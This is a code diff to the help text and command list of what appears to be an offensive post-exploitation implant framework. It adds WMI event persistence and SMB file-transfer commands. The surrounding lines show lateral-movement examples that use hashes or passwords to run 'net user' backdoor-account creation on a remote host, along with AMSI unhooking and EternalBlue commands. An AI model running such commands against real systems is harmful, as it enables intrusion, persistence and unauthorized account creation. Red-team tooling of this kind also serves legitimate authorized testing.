@@ -109,12 +109,16 @@ installexe-persistence
 removeexe-persistence
 install-servicelevel-persistence | remove-servicelevel-persistence
 install-servicelevel-persistencewithproxy | remove-servicelevel-persistence
+invoke-wmievent -name backup -command "powershell -enc abc" -hour 10 -minute 30
+get-wmievent
+remove-wmievent -name backup
 
 Network Tasks / Lateral Movement:
 ==================
 get-externalip
 test-adcredential -domain test -user ben -password password1
 invoke-smblogin -target 192.168.100.20 -domain testdomain -username test -hash/-password
+invoke-smbclient -Action Put -source c:\\temp\\test.doc -destination \\test.com\\c$\\temp\\test.doc -hash
 invoke-smbexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
 invoke-wmiexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
 net view | net users | net localgroup administrators | net accounts /dom
@@ -328,7 +332,8 @@ COMMANDS = ['loadmodule',"bloodhound","brute-ad","brute-locadmin",
 "install-servicelevel-persistence","remove-servicelevel-persistence","reversedns",
 "invoke-eternalblue","loadmoduleforce","unhook-amsi","get-implantworkingdirectory","get-system",
 "get-system-withproxy","get-system-withdaisy","get-pid","listmodules","modulesloaded",
-"startanotherimplant","remove-persistence","removeexe-persistence","installexe-persistence","resolve-ipaddress"]
+"startanotherimplant","remove-persistence","removeexe-persistence","installexe-persistence",
+"resolve-ipaddress","invoke-wmievent","remove-wmievent","get-wmievent","invoke-smbclient"]
 
 COMMANDS += ['invoke-psexecpayload','invoke-wmipayload', 'invoke-dcompayload']
 COMMANDS += ['invoke-psexecproxypayload','invoke-wmiproxypayload', 'invoke-dcomproxypayload']
